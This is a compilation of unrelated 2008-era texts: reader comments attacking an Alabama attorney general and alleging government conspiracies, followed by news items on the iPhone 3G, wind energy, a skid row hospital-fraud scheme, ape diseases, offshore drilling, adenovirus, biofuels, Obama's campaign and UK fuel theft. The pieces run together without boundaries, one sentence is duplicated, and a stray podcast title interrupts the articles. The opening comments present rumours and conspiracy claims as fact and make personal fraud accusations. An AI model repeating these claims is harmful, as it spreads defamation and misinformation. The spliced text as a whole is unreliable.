At the point of knowing about Colombian Condominiums and a get - rich - quick flight pattern , he would have been " in too deep . "
It 's too bad his Naval intelligence was most likely leaked to my uncles .
So now , I and my remaining children ?
We 're sitting ducks .
I think of this country thirty years from now and American grandchildren working 30 years labor happy to be employed by the Japanese or Germans who own the companies .
Or they might be working the grand casinos or tourism industry to be of service and beholden to those wealthy foreigners who can afford vacations .
They could well be struggling to pay the foreign companies price for drinking water , or foreign owner 's requirements for American electricity .
That the leadership of this country has sold it from our children , and spend our descendants in wars is incredible .
In fact , it 's insane .
But in this country , only " crazy " people dare tell the truth .
Otherwise , you might lose in court and be ushered to prison .
Worse , you might end up like " Dark Alliance " truth - teller , Gary Webb with two bullets in your head , ruled " suicide . "
Best wishes , Mr. Adams .
It 's everywhere .
And Nathan , please make a " pedophile " card deck and another one with Cunningham , Foggo and friends for Corruption / Racketeers .
Pedophiles seem to be expendable worker bees for these underground planners , and " drowning in corruption " is an understatement for the U.S.A .
My Mother said to be promoted as an officer in the USN , my Dad was required to watch pornography .
It 's all beginning to make sense , now .
Somebody has to enlighten Americans about the American Fascist card games , and it wo n't be FOX NEWS .

I think every judicial decision Troy King has ever supported , based on his hypocritical anti-gay rants and writings , should be reversed .
He should be disbarred since his every accomplishment has been based on a fraudulent persona .
I think he should admit that he is a cheater , a liar , a fake and that his marriage is not only a slap in the face of religion , but also a means to commit insurance fraud since he could not take a " husband " and collect any benefits .
Fraud charges should then be filed and he should be made to answer for his lies and indiscretions .
The only drawback would be that in the UNLIKELY event he were found guilty , sending him to prison would be like sending a child to Disney world .
Unfortunately , people in high places have friends there too .
As in all matters politically embarrassing , these power - whores wo n't be seen or heard , but he will never be punished for anything .
They are too busy chasing me around for being poor and harmless .
GOD BLESS AMERICA .
what a joke .

Why is the democrat party not acting on this " Catagory X " storm ?
Why are n't the gay and lesbian communities in Alabama and this nation not outraged ?
Why are there no petitions for a federal investigation into the rumors ?
I live in Alabame and Troy King 's " Anti-gay " , " gay - hate - mongering " campagin / platform always made Jerry Falwell look like a whiney week - old baby kitten .
I'm a straight republican who is OUTRAGED at King 's hyporcary .
Why is Civil Liberties not all over this ?
I agree , ever action on Kings part which effected gays ( in any context ) is questionsable ; should be reviewed and thrown out .
How about the employees in the ATG 's office who ( now for sure ) work in a legally defineded " Hostile Work Environment " : sexual activities between employees which creates / created a burden or discrimination for the other employees .
The citizens of the great state of Alabama deserve better than what is forced down our throats by King 's refusal to resign and the GOP 's conver - up and suport his decision .
There 's no way he can effectively function in his capacity as the ATG because he has abandoned the ethics of his oath of office ; has no credability , his hypocracy cancels ANY credability he ever had thus rendering him incapable of functioning as Attonrey General of Alabama .
The GOP think this will go away like Texas Governor Perry 's gay sex scandle .
I PRAY NOT !!!
HOEPFULLY , SOMEONE IN A NATIONAL MEDIA VENUE HAS COURAGE ENOUGH TO BRING TO LIGHT THAT " ANOTHER REPUBLICAN COVER-UP OF ONE OF THEIR'S , RUMORED TO HAVE BEEN OUTED IN GAY SEX SCANDLE " .
The most terrifying part of the entire situation is this : IT PROVES THE REPUBLICAN PARTY CONTINUES TO TWIST THE TRUTHS , LIE , BE DECIETFUL PUTTING PARTY OVER THE CITIZENS OF OUR STATE AND NATION .
John McCain lost my vote too becasue he 's also in " cover - up " mode .
SOME CHANGE , John Boy ! ! !
The Republican party a machine , which is " toxic " , and a party of deciet , dishonesty , double standards and hyporcacy .
WE NEED TO VOTE EVERY REPUBLICAN OUT OF ANY OFFICE THEY HOLD IN NOVEMEBER and return some integrity to politics !
I understand the position of the " concern for King 's children " .
What about all the parents who 's gay and lesbian children King has degraded , mocked , put down , and on upon who 's backs King 's " FAMILY VALUES - ANTI - GAY " campaign put in the ATG office ?
I think the christian - right will justify this because King is a Southern Baptist !
If King had been a democrat this " rumor " would have already been on EVERY national news network every 15 minutes since it first surfaced .

Dan Frommer describes here how AT&T 3G iPhone users are using much less bandwidth than AT&T expected because AT&T's 3G iPhone service is so crappy .
Dan recently got a software update from Apple that improved the 3G service , which suggests that the problem was Apple 's problem .
But his phone is still slow .
So it 's time Apple responded to the advertisment below ( from August ) .
The ad appears to demonstrate a 3G iPhone that has never been seen in the wild and bears no resemblance to the 3G iPhones Apple is minting money with .
Is Apple 's advertising as deceptive as it seems ?
What does Steve Jobs have to say about this ?
Are Apple 's quality standards -- from products to messaging -- starting to slip ?
We know Apple 's working hard to make the 3G phone faster , but it 's time the company also responded to the ad .

The American Wind Energy Association is expected to release a survey next month that says the US has become the world 's leading wind producer , and that the industry expects rapid growth to continue in places like Texas , the Great Plains and California .
The survey calculates that the US wind industry now tops Germany in terms of how much energy is being produced from wind .
Germany still has more installed capacity - 22,000 megawatts compared with 17,000 in the US at the end of 2007 .
But the average wind speed is stronger in America , which means more energy is being generated , the group said .
And this year , Germany will add only about 1,600 megawatts of wind energy , while the US will add more than 6,000 megawatts , said Randy Swisher , executive director of the association .
" The numbers themselves are not what matters , " said Swisher .
" What matters is that the wind industry around the world recognises that the US is the largest market . "
That 's important because many of the world 's leading wind companies are not US companies , and they will need to move manufacturing jobs to the US as the wind industry grows , Swisher said .
His group says 4,000 wind - related manufacturing jobs have been added in the US since 2007 .
Currently , wind provides about 1 % of US electricity .
In California , Pacific Gas & Electric has been using wind power for decades , and has been aggressive in adding new contracts for wind energy in the last four years as it strives to meet the state 's renewable energy goal of 20 % by 2010 .
PG&E has 1,164 megawatts of wind energy in operation or under contract , said spokeswoman Jennifer Zerwer .
The cost of wind power is almost comparable to fossil fuels such as coal , at between 4.5 and 7.5 cents per kilowatt hour , according to FPL Energy , builder of the country 's largest wind farm in Horse Hollow , Texas .
But building a wind farm costs more than a fossil - fuel plant - between $ 1.5 m and $ 2 m per megawatt of capacity compared with $ 800,000 for a natural - gas plant .
Once constructed , though , wind plants have no fuel costs compared with coal and natural gas plants .
The industry says that 250 to 300 average US homes are served by one megawatt of wind energy .

British Airways ( BAIRY ) announced this morning that it is cutting flights ( what airline is n't ? ) and that its profit dropped 90 % to $ 54 million ( at least they had a profit ! ) .
However , the real news is BA chief Willie Walsh 's further apocalyptic rhetoric about the airline industry :
We are in the worst trading environment the industry has ever faced .
The combination of unprecedented oil prices , economic slowdown and weaker consumer confidence has led to substantially lower first - quarter profits .
It was only a little over 2 months ago that Walsh warned of this outcome ( and more airline bankruptcies ) :
This is about whether airlines can survive .
If you look at a lot of the low - cost carriers around Europe , a lot of them have not been able to make money when oil was $ 80 per barrel .

“ Dustin Yellin on Making Art , Weaving Madness , and Forging Your Own Path ( # 467 ) ”
On a Sunday afternoon two years ago , five homeless people being dropped off on Los Angeles ’ skid row by an ambulance caught the attention of police officers .
The officers videotaped what they thought was a case of hospitals dumping patients in a section of the city where few would notice or care .
But as investigators began to unravel the incident , they say they found something far different : a massive scheme to defraud taxpayer - funded healthcare programs of millions of dollars by recruiting homeless patients for unnecessary medical services .
The elaborate enterprise churned thousands of indigents through hospitals over the last four years and billed Medicare and Medi-Cal for costly and unjustified medical procedures , federal , state and local investigators said Wednesday .

Those involved in the alleged conspiracy “ ranged from street - level operatives to the chief executive of a hospital , ” U.S. Atty .
Thomas P. O’Brien said .
After raids on three hospitals in Los Angeles and Orange counties Wednesday , one hospital chief executive faces criminal charges and executives at two other facilities were accused of fraudulent business practices in a related civil lawsuit filed by Los Angeles City Atty .
Rocky Delgadillo .
Some of the homeless patients involved received tests or treatments that were potentially harmful , authorities said .
The “ depravity ” of the alleged scheme startled authorities , said Salvador Hernandez , assistant director in charge of the FBI ’s Los Angeles office .
Advertisement
“ The defendants are accused of preying on the homeless and exploiting their desperate conditions for personal gain , ” he said .
Arrested on federal charges were Dr. Rudra Sabaratnam , an owner and chief executive of City of Angels Medical Center , and Estill Mitts , an alleged patient recruiter who operated a storefront facility called the Assessment Center in the heart of skid row .
A 21 - count grand jury indictment accuses the pair of healthcare fraud and receiving illegal kickbacks .
Mitts , who was released Wednesday afternoon on $ 25,000 bail and confined to his home , is also charged with money laundering and income tax evasion .
His attorney declined to comment .
Late Wednesday , Sabaratnam ’s attorney , John Vandevelde , argued at a court hearing that the charges against his client were “ not that significant . ”
But the doctor was being held in custody until another hearing today .
In addition to City of Angels , agents earlier Wednesday swarmed Los Angeles Metropolitan Medical Center and Tustin Hospital and Medical Center in Orange County .
Pacific Health Corp. , which owns both hospitals , said in a statement that it had cooperated with authorities and believed it would be cleared of any illegal conduct .

Officials said the investigation was continuing and additional defendants were expected to be charged .
The total amount of the fraud was still being tallied , but prosecutors said Mitts ’ operation could have cost the government $ 11 million in improper payments and that City of Angels collected $ 5 million in federal healthcare reimbursements .
City of Angels did not respond to requests for comment .
Delgadillo sued the three hospitals , their operators and several others .
The hospitals used unfair business practices to fill empty beds in a bid to boost their finances , the suit claims .
The privately owned medical centers allegedly worked with patient recruiting operations on skid row that plucked homeless people from the streets and delivered them , with fake medical diagnoses , to the hospitals .
According to court filings , “ runners ” or “ stringers ” on skid row looked for homeless recruits .
Prospects were offered small sums of money , typically $ 20 or $ 30 , to be paid upon completion of a hospital stay of one to three days .
The street recruiter typically received $ 40 for each homeless recruit with Medicare eligibility and $ 20 for each recruit with Medi-Cal benefits , according to the city attorney ’s lawsuit .
Advertisement
Some solicitations were direct , but others were coded , according to the city attorney ’s lawsuit .
One alleged street pitch referred to the color scheme of the Medi-Cal eligibility card : “ Red , white and blue , just make it do what it do , for me and you . ”
A person familiar with the workings of the alleged scheme told The Times last year that employees at the Assessment Center would recruit people on skid row to reach out to potential patients , who may or may not have needed medical treatment .
The source , who spoke on the condition that he not be named , said some patients were reimbursed for their time with money , food or a pack of cigarettes -- what was called an “ incentive . ”
In other instances , the source said , patients walked into the center on their own .
Recruiters “ were looking for someone who was sick or immobile , ” the source said .
“ Someone who was in need of money , who was down and out , sleeping on the street , with nowhere to go . ”

The source said it did n’t matter whether the patients were currently using drugs or not , or whether they had underlying psychiatric issues .
Delgadillo said patients received treatment for conditions including dehydration , a yeast infection and a cardiopulmonary disorder that “ did n’t exist . ”
One patient , referred to in the city attorney ’s lawsuit as “ Recruit X , ” suffered from a mental disorder and was sent by the Assessment Center to all three of the medical centers .
At one of the hospitals , the lawsuit says , the patient was given a nitroglycerin patch for a nonexistent cardiopulmonary condition , causing a precipitous drop in her blood pressure .
The treatment , said Delgadillo “ put her in peril . ”
Wednesday ’s crackdown sends a message that “ those who would seek to defraud our healthcare system , and those who would callously exploit mentally impaired and drug - addicted homeless men and women to turn a profit will be prosecuted to the fullest extent of the law , ” Delgadillo said .

In addition to Mitts and Sabaratnam , the city attorney ’s civil lawsuit names Pacific Health Corp. ; Los Angeles Doctors Hospital Corp. , which operates Los Angeles Metropolitan Medical Center , corporation Chief Executive John Fenton and admitting physician Frederick Rundall ; and Tustin Hospital and Medical Center , Chief Executive Daniel Davis , Chief Financial Officer Vincent Rubio and admitting physicians Kenneth Thaler and Al - Reza Tajik .
Also named are Intercare Health Systems Inc. , which owns and operates City of Angels Medical Center , and Robert Borseau , who , like Sabaratnam , was an owner / officer .
Most of the defendants could not immediately be reached for comment .
The Tustin hospital was allegedly guaranteed 40 to 50 patients a month ; City of Angels got 25 to 30 .
Metropolitan Medical Center received patients whenever beds were available , according to the suit .
City attorneys allege that the admitting Drs. Rundall , Thaler and Tajik did not see the patients until shortly before their discharge .
City attorneys allege that for patient referrals , Mitts ’ group was paid $ 20,000 per month each from Metropolitan Medical Center and Tustin , while City of Angels paid between $ 400 to $ 1,000 a week to the recruiting group .
The suit also alleges that Rubio , the Tustin hospital ’s chief financial officer , personally received a $ 3,500 - a- month kickback from Mitts ’ group to ensure that Tustin continued to take homeless patients from the skid row center .

Alleged scam

Here is how the alleged medical center treatment scam worked , according to authorities :
- Runners are paid $ 20 to $ 40 per head to recruit skid row denizens .
- Skid row recruits are directed to a storefront facility , where their eligibility for medical benefits is verified and phony medical conditions are invented .
- The “ patients ” spend one to three days in a hospital . . .

- . . . and then return to the storefront center , where they are paid $ 20 to $ 30 .
- The storefront center bills the hospital for the recruits .

Animal rights activists are campaigning to get Matthew Hiasl Pan , a 26 - year - old chimpanzee , legally declared a person and vowed to take their challenge to Austria 's Supreme Court .
Common human viruses are killing endangered great apes .
A new study reveals a dark side to research and ecotourism , both of which ironically are aimed to help the apes and which may still do more good than harm .
Scientists investigated chimpanzees hit by five outbreaks of respiratory disease between 1999 and 2006 in Côte d'Ivoire in West Africa .
Nearly all the endangered chimps became sick and many died .
All available tissue samples gathered from chimp victims tested positive for one of two germs — human respiratory syncytial virus ( HRSV ) or human metapneumovirus ( HMPV ) .
These viruses often cause respiratory disease in humans and , in developing countries , are a major source of infant mortality .
" The viruses we found are very common , " said researcher Fabian Leendertz , a wildlife epidemiologist at the Robert Koch - Institute and Max Planck Institute for Evolutionary Anthropology in Germany .
" Antibody prevalence in humans is almost up to 100 percent , meaning almost everybody has had contact with these viruses " and developed antibodies , naturally , designed to fight the germs .
These cases represent the first confirmed evidence of viruses transmitted directly from humans to wild great apes .
" Virtually all diseases that can harm us can harm the great apes since we share so many genetic and physiologic properties , " Leendertz told LiveScience .
Swapping diseases
There is a long history of diseases spreading from great apes to humans , and perhaps from humans to great apes :
Ebola is a widespread threat to gorillas and chimps in Central Africa , and may have spread to humans from people who ate infected animals .
Ebola and SARS may both have originally come from bats .
HIV , the virus that causes AIDS , originated from chimps and other primates .
Gorillas may have given humans pubic lice , or " the crabs . "
There have been suspicions that chimps at Gombe Stream National Park in Tanzania contracted polio from humans , Leendertz said .
There have also been concerns that gorillas contracted yaws , a disease related to syphilis that is not sexually transmitted , from humans , Leendertz added .
Gorillas and chimpanzees in West Africa have been killed by outbreaks of anthrax .
This may have originated from cattle herded by humans , although Leendertz noted these may have been natural events that just exist there in the forests .
Although research and ecotourism efforts have brought people into greater contact with endangered great apes in the wild , potentially threatening the primates , " research and tourism has a strong positive effect on great apes ' survival since it reduces poaching activities in these areas and gives more ' political weight ' to the apes and protected areas , " Leendertz added .
Indeed , studies suggest the protective effect researchers have against poachers outweighed the substantial chimpanzee death rate caused by human diseases , said Christophe Boesch of the Max Planck Institute for Evolutionary Anthropology .
" However , it comes with some hygienic problems which need to be addressed , " he added .
Keeping a distance
The scientists have already stepped up guidelines to help minimize the risk of infection to chimpanzees , and they urge others to do the same .
For example , Leendertz said , he and his colleagues now wear masks , keep a distance of at least 20 feet from the chimps , and disinfect their boots regularly .
" We need to be much more proactive about instituting strict hygiene precautions at all ape tourism and research sites , " Leendertz said .
" One possibility for promoting compliance is a certification process similar to the green labeling system now used in the timber industry . "
Human diseases that could attack the great apes include germs " that are easily transmitted , such as respiratory disease or diarrhea - causing pathogens , and also those that persist long in the environment , since this creates a higher chance of transmission , " Leendertz said .
The researchers will detail their findings in the Feb. 26 issue of the journal Current Biology .

My first reaction to Bill Clinton ’s convention speech was sheer professional jealousy : nobody , but nobody , has his ability to translate economic wonkery into plain , forceful English .
In effect , Mr. Clinton provided an executive summary of the new Census report on income , poverty and health insurance  but he did it so eloquently , so seamlessly , that there was no sense that he was giving his audience a lecture .
My second reaction was that in Mr. Clinton ’s speech  as in the speeches by Hillary Clinton and Joe Biden ( this column was filed before Barack Obama spoke on Thursday night )  one heard the fundamental difference between the two parties .
Democrats say and , as far as I can tell , really believe that working Americans are getting a raw deal ; Republicans , despite occasional attempts to sound sympathetic , basically believe that people have nothing to complain about .
As it happens , the numbers support the Democrats .
That Census report gives a snapshot of the economic status of American families in 2007  that is , before the financial crisis started dragging the economy down and the unemployment rate up .
It ’s a given that 2008 will look much worse , so last year was as good as it will get in the Bush years .
Yet working - age Americans had significantly lower median income in 2007 than they did in 2000 .
( The elderly , whose income is supported by Social Security  the program the Bush administration tried to kill  saw modest gains . )
Meanwhile , poverty was up , and health insurance  especially the employment - based insurance on which most middle - class Americans depend  was down .
But Republicans , very much including John McCain and his advisers , do n’t believe there ’s a problem .
Former Senator Phil Gramm made headlines , and stepped down as co-chairman of the McCain campaign , after he described America as a “ nation of whiners . ”
But how different was that remark , really , from Mr. McCain ’s own declaration that “ there ’s been great progress economically ”  progress that ’s mysteriously invisible in the actual data  during the Bush years ?
And Mr. Gramm , by all accounts , remains a key economic adviser to Mr. McCain .
Dinosaurs survived two mass extinctions and 50 million years before taking over the world and dominating ecosystems , according to new research published this week .
Dinosaurs survived two mass extinctions and 50 million years before taking over the world and dominating ecosystems , according to new research published this week .
Reporting in Biology Letters , Steve Brusatte , Professor Michael Benton , and colleagues at the University of Bristol show that dinosaurs did not proliferate immediately after they originated , but that their rise was a slow and complicated event , and driven by two mass extinctions .
“ The sheer size of dinosaurs like Tyrannosaurus makes us think there was something special about these animals that preordained them for success right from the beginning , ” Brusatte said .
“ However , our research shows that the rise of dinosaurs was a prolonged and complicated process .
It is n’t clear from the data that they would go on to dominate the world until at least 30 million years after they originated . ”
Importantly , the new research also shows that dinosaurs evolved into all their classic lifestyles – big predators , long - necked herbivores , etc. – long before they became abundant or diversified into the many different species we know today .
Brusatte added : “ It just was n’t a case of dinosaurs exploding onto the scene because of a special adaptation .
Rather , they had to wait their turn and evolved in fits and starts before finally dominating their world . ”
Dinosaurs originated about 230 million years ago and survived the Late Triassic mass extinction ( 228 million years ago ) , when some 35 per cent of all living families died out .
It was their predecessors dying out during this extinction that allowed herbivorous dinosaurs to expand into the niches they left behind .
The rapid expansion of carnivorous and armoured dinosaur groups did not happen until after the much bigger mass extinction some 200 million year ago , at the Triassic - Jurassic boundary .
At least half of the species now known to have been living on Earth at that time became extinct , which profoundly affected life on land and in the oceans .
Historically the rise of the dinosaurs has been treated as a classic case in which a group evolves key features that allow it to rapidly expand , fill many niches , and out - compete other groups .
But Professor Benton said the story is n’t so simplistic : “ We argue that the expansion of the dinosaurs took up to 50 million years and was not a simple process that can be explained with broad generalizations . ”
Nearly 40 years after some 80,000 barrels of oil washed up on the beaches of Santa Barbara ­ and launched a move to ban offshore drilling ­ Congress is heading toward a vote to end that moratorium .
For a generation of Democratic politicians , the notion of opening protected sites to drilling was toxic .
But with soaring gas prices , public opinion is shifting toward anything that promises relief at the pump ­ and congressional politics is moving with it .
In a shift on Saturday , Speaker Nancy Pelosi said that the House will take up comprehensive energy legislation next month that includes partially lifting the 1981 ban on offshore drilling .
" It will consider opening portions of the Outer Continental Shelf for drilling , with appropriate safeguards , and without taxpayer subsidies to Big Oil , " she said in the weekly Democratic radio address on Saturday .
On Friday , Senate majority leader Harry Reid said that the Senate will also examine lifting the ban , which now covers all but central and western portions of the Gulf of Mexico and some parts of Alaska .
" That 's something that you know we ¹re going to take up .
And there¹s nothing wrong with that , " he said in a conference call with Texas oilman T. Boone Pickens .
Until Saturday , Speaker Pelosi called the notion that more drilling would lower prices at the pump a hoax and said that there would be no votes on this issue on her watch .
With the US controlling some 3 percent of the world 's proven oil reserves , drilling in protected sites won¹t solve the problem of high gas prices in the short term , if ever , Democrats said .
Their solution : increase conservation and alternative fuel sources , tax Big Oil for its record ' windfall profits , ' rein in speculation in the commodities market , and end billions in tax subsidies for oil companies now written into the tax code .
Before opening any new sites for exploration and drilling , Big Oil should first prove that it has used available leases on some 68 million acres , Democrats said .
After President Bush lifted the executive moratorium on offshore drilling last month , Republicans called on the majority to allow votes to lift the congressional ban , as well .
Senate Republicans , citing support from constituents worried about energy costs , reduced their legislative agenda to a single item : increase domestic energy supply .
In a bid to force an offshore drilling vote , GOP senators blocked votes on all other elements of an energy plan , including a popular measure to extend tax breaks for renewable energy .
Both houses broke for August recess without a vote on offshore drilling .
On the House side , Republicans have held nearly daily protests on the floor of the House during the August recess to force Pelosi to allow a vote to lift the congressional moratorium on offshore drilling .
Since Aug. 1 , 109 Republicans have returned to Washington to argue the case for offshore drilling on the floor of an adjourned House .
" Our members are finding at home that what we¹re doing here in Washington is appreciated , " said Rep. Roy Blunt , the House Republican whip , at a press briefing off the floor of the House on Thursday .
" At least somebody is willing to fight for the No. 1 issue for their families today ­ and that 's gas prices , soon to be followed by energy prices , as we get to the fall . "
Meanwhile , Democrats are gearing up for major energy legislation when Congress returns next month .
On Tuesday , Senator Reid is convening a national clean energy summit in Las Vegas .
He is calling on Republicans to support a bipartisan summit ­ and comprehensive energy legislation ­ when the Senate reconvenes .
The broader energy bill to be debated on the floor of the House covers conservation as well as new investments in alternative fuels .
The plan mandates the release of some 700 million barrels of oil from the US Strategic Petroleum Reserve to " reduce the price at the pump within 10 days , " Pelosi said on Saturday .
The plan also requires oil companies to pay the billions of dollars in royalties to be invested in clean energy resources and aims to rein in speculation in energy markets , viewed by lawmakers on both sides of the aisle as a factor in the run-up of gas prices .
In response , House Republican leaders called on the speaker to immediately reconvene the House to vote on a GOP bill to ' drill here , drill now , and pay less . '
" While the Speaker now claims to embrace a comprehensive energy plan that includes more conservation , more innovation , and more American energy production , the fact is her new effort appears to be just another flawed plan that will do little to lower gas prices , " House Republican leader John Boehner said in a statement .
Even if proposed legislation on both sides of the aisle derails , Republicans are gearing up for one more flash point : On Oct. 1 , the start of the new fiscal year , the moratorium on drilling automatically lapses , unless Congress renews it .
Some Republicans are urging President Bush to veto any spending bill ­ or any continuing resolution to extend spending bills into the new Congress ­ that includes a renewal of the offshore drilling ban .

A newly discovered and highly lethal virus strain begins with symptoms similar to that of a cold but can quickly lead to severe respiratory crisis .
" This virus has the capability of causing severe respiratory illness in people of all ages , regardless of their medical condition , " said John Su , of the Centers for Disease Control and Prevention .
The virus was discovered by infectious - disease expert David N. Gilbert , who noticed that otherwise healthy patients were being stricken by pneumonia so severe that they would die without oxygen treatment .
The dangerous symptoms developed within only one or two days of initial cough and fever symptoms .
Since Gilbert 's discovery of the virus in Portland , Oregon , outbreaks have been identified at military bases in Washington , Texas and South Carolina .
The disease is a variety of adenovirus , the family that includes 51 infectious agents responsible for diseases such as colds , pink eye , bronchitis and the stomach flu .
A mutation has apparently occurred in a virus called adenovirus 14 , making it much more lethal .
In the first outbreak examined by Gilbert , seven of 30 hospitalized patients died .
" That 's an incredibly high mortality rate , " Gilbert said .
One of the patients who survived was 18 - year - old Joseph Spencer .
After experiencing severe , flu - like symptoms including chills , fever and vomiting , Spencer went to the hospital , where he was placed in intensive care and treated for 18 days .
" We told the family we did n't think he was going to survive , " Gilbert said .
Spencer was eventually discharged , but says he still feels weak and short of breath , and has had problems with his memory .
Tests have determined that more 50 percent of adenovirus infections in Oregon are now caused by the new strain of adenovirus 14 .
" That 's shocking , " said Paul Lewis , an Oregon health investigator .
" It went from being imperceptible to being the majority .
" Health officials caution that while the vast majority of cold - like infections are harmless , patients whose symptoms continue getting worse should see a doctor .
University of Georgia researchers have developed a new technology that promises to dramatically increase the yield of ethanol from readily available non-food crops , such as Bermudagrass , switchgrass , Napiergrass — and even yard waste .
" Producing ethanol from renewable biomass sources such as grasses is desirable because they are potentially available in large quantities , " said Joy Peterson , professor of microbiology and chair of UGA 's Bioenergy Task Force .
" Optimizing the breakdown of the plant fibers is critical to production of liquid transportation fuel via fermentation . "
Peterson developed the new technology with former UGA microbiology student Sarah Kate Brandon , and Mark Eiteman , professor of biological and agricultural engineering .
The new technology features a fast , mild , acid - free pretreatment process that increases by at least 10 times the amount of simple sugars released from inexpensive biomass for conversion to ethanol .
The technology effectively eliminates the use of expensive and environmentally unsafe chemicals currently used to pretreat biomass .
The technology is available for licensing from the University of Georgia Research Foundation , Inc. , which has filed a patent application .
Inexpensive waste products — including corn stover or bagasse , the waste from corn and sugar cane harvests , fast - growing weeds — and non-food crops grown for biofuel , such as switchgrass , Napiergrass and Bermudagrass , are widely viewed as the best sustainable resources for ethanol made from biofuels .
" Using non -food crops that can be grown on marginal lands , like grasses , and fibrous waste streams like corn stover , is important because of the ongoing food - versus - fuel debate , " said Peterson .
" When agricultural crops , such as corn or potatoes , are grown for biofuels production , the cost of the starting material may fluctuate greatly because of competing demands for food and feed .
The trade - off with using a biomass like grasses is that grasses are harder to break apart than corn or potatoes , and the cost of making the same fuel , like ethanol , rises . "
Developing an efficient , cost - effective process to convert the fibrous stalks , leaves , and blades of plant wastes into simple sugars is the biggest challenge to bio - based ethanol production .
Thick , complex plant cell walls are highly resistant to efforts to break them down .
Currently , woody biomass requires soaking under high pressure and temperatures in expensive , environmentally aggressive bases or acids before it is subjected to enzymes that digest it , producing simple sugars .
The harsh pretreatment solutions subsequently must be removed and disposed of safely .
They also cause formation of side products that can slow down the conversion of the sugars into ethanol .
In contrast , the environmentally friendly UGA technology eliminates the expense of harsh pretreatment chemicals and their disposal , and the formation of side products is minimal .
" The new technology has commercial application for the biomass industry , including producers of sugar cane , corn , switchgrass , Napiergrass and other woody biomass crops , " said Gennaro Gama , UGARF technology manager responsible for licensing this technology .
" It may also help renewable energy and biofermentation companies — and local governments .
" By allowing for the use of myriad raw materials , this technology allows more options for ethanol facilities trying to meet nearby demand by using locally available , inexpensive starting materials , " he added .
" This would greatly reduce the costs and carbon footprint associated with the delivery of raw materials to fermentation facilities and the subsequent delivery of ethanol to points of sale .
Local production of ethanol may also protect specific areas against speculative fluctuations in fuel prices .
" It 's easy to imagine that this easy - to - use , inexpensive technology could be used by local governments , alone or in partnership with entrepreneurs , to meet local demand for ethanol , possibly using yard waste as a substrate , " he said .

YOUNGSTOWN , Ohio -- A day after saying the U.S. could produce enough renewable energy within 10 years to replace all U.S. imports of Middle East oil -- a goal even he admitted sounded " pie in the sky " -- Sen. Barack Obama , D - Ill. , said " for the sake of our economy , our security , and the future of our planet , we must end the age of oil in our time . "
At the beginning of his town hall meeting focused on energy policy at the Austintown Fitch High School this morning , in this blue - collar burg in a pivotal swing state , Obama told the estimated crowd of 2,400 Ohioans , " I can tell this is a feisty group . "
But the senator 's feistiness was on display as well , as he mocked his Republican opponent 's campaign tactics and energy plan , and pushed an aggressive " use it or lose it " strategy for offshore oil leases .
Seeking to shift focus away from the debate over whether oil companies should be permitted to conduct more offshore drilling exploration , Obama said , " Right now , oil companies have access to 68 million acres where they are n't drilling .
So we should start by giving them a choice : use it or lose it .
Use the land you have , or give up your leases to someone who will . "
After Obama noted local gas prices -- $ 3.70 a gallon , " two and a half times what it cost when President Bush took office " – a member of the audience yelled out : " They had a plan ! "
" They had a plan , " agreed Obama .
" Problem was it was the oil company plan .
It was the gas company plan .
We need a people plan !
And that 's why I 'm running for president . "
Energized Battle
Obama also had some words about his opponent .
" John McCain wants to talk about Britney Spears , and Paris Hilton , " Obama said , referring to his opponent 's TV ad dismissing Obama as a mere " celebrity . "
" That 's his idea of a really relevant campaign .
But I do n't have time to deal with that mess , because America 's facing some serious problems .
America 's facing some serious challenges . "
The presumptive Democratic presidential nominee told the crowd how McCain had yesterday in eastern Pennsylvania repeatedly said " we have to drill here and drill now . "
" Instead of offering a real plan to lower gas prices , the only energy plan that he 's really promoting is more drilling , " Obama said .
" That 's what he talked about yesterday .
I want to drill here .
I want to drill now .
I do n't know where he was standing , " he said as the crowd laughed .
" I think he was in a building somewhere . "
He continued to paint McCain as " in the pocket " of oil companies .
" The oil companies have placed their bet on Senator McCain , and if he wins , they will continue to cash in while our families and our economy suffer and our future is put in jeopardy , " Obama said , adding that McCain offers " four years more of oil companies calling the shots while hard - working families are struggling . "
At one point , asked about his support for high - speed rail , Obama lapsed into what was almost a comedy routine .
All he needed was a fake brick wall behind him and a two - drink minimum .
" If you think about the Midwest , think about right here , what we 've got is all kind of towns that we could connect , " Obama said .
" All of these cities are , they basically take in the air about 45 minutes to an hour to fly . "
" But by the time you get to the airport , " Obama continued , " take off your shoes , get to the terminal , realize that your flight 's been delayed two hours , go pay $ 10 for a cup of coffee , and a sandwich for another $ 10 , come back , you get on the plane , you 're sitting on the tarmac for another 25 minutes , you finally take off , you 're circling above the city for another half hour , when you land they can't find your luggage , and then you get to where you 're going -- by the time it 's all done it 's a five - hour trip !
… So the time is right now for us to start thinking about high - speed rail as an alternative to air transportation , connecting all these cities and think about what a great project that would be in terms of rebuilding America . "
Going Negative
Obama found a supportive crowd , and was greeted with cheers when he attacked his opponent for waging a negative and misleading campaign .
" When John McCain 's campaign goes out there and starts saying things like I 'd rather lose a war to win an election , or when he says that somehow I did n't want to visit the troops in Germany even though every reporter says that 's not true , well , you 're not trying to solve problems , " Obama said .
" All you 're trying to do is divide people , so you can win an election .
That 's nothing to be proud of .
Let 's have a real honest debate about policies that are going to make a difference in people 's lives . "
Obama was introduced by Ohio Gov. Ted Strickland , a former supporter of Sen. Hillary Clinton , D - N.Y. , who promised , " We will put our heart and soul into every day between now and November 4th . . . to make sure , that this bright , young , energized , compassionate , intelligent , committed , young man by the name of Barack Obama becomes our next president . "
It used to be deer poaching , now rural gangs move into the oil business
It may not be quite like the film Mad Max out there , with violent gangs roaming Britain in search of the few remaining drops of fuel , but for farmers like Eddie Cowpe it feels a little bit like it .
He returned to his farm shop in Lancashire recently to find that thieves had emptied his 10,000 - litre diesel tank .
What they did not take they let drain away on to his stone yard and into the water course , leaving Cowpe facing a bill of almost £ 70,000 for the fuel lost and the clean - up .
" I said two years ago that this country was going to see serious civil unrest and riots because of food and fuel shortages , " said Cowpe .
" It 's going to come true .
It 's a frightening scenario .
These people are morons and vandals .
They just do n't care .
I do n't know where it 's going to end . "
In the week that Rosemary Dove , a farmer 's wife from Co Durham , collapsed and died after an alleged diesel raid , the fuel crisis is hitting farmers , truckers , motorists and householders in the pocket - and making them feel rather less safe .
With oil prices jumping to another record high yesterday to break through the $ 142 a barrel level , it is likely to become an even more attractive target for thieves .
The latest surge in prices took oil up to $ 142.26 , with Opec predicting that it could soon hit $ 170 a barrel .
Oil prices have been on an upward trend since the millennium , when they were around $ 10 - 20 a barrel .
The huge increases have led to gangs of thieves in lorries or vans fitted with drums and pumps roaming the countryside , often tailing tankers so they can be sure of finding freshly topped - up containers .
Petrol stations are even setting up " stingers " that puncture the tyres of motorists who drive off without paying and farmers are getting together to create secure compounds for their fuel .
